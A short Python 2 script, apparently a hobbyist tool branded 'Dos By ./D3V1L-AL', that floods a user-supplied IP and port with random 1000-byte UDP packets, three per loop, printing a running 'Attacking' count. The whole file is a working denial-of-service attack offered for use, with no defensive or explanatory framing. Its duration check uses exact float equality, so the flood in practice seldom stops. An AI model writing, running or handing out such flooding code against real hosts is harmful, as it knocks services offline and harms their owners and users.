#!/usr/bin/python
 
import argparse
import socket
import random
import time
 
parser = argparse.ArgumentParser(description="Dos By ./D3V1L-AL")
parser.add_argument('-t','--target',help='Enter the target ip',required=True)
parser.add_argument('-p','--port',help='Enter the target port',required=True)
parser.add_argument('-d','--duration',help='Enter the duration in seconds',required=True)
args = parser.parse_args()
sck = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
rand_data = random._urandom(1000)
sent = 0
time1 = time.time() + int(args.duration)
while True:
    sent += 1
    sck.sendto(rand_data, (args.target,int(args.port)))
    sck.sendto(rand_data, (args.target, int(args.port)))
    sck.sendto(rand_data, (args.target, int(args.port)))
    print "Attacking %s:%s | %s" % (args.target,args.port,sent)
    if time.time() == time1:
        break
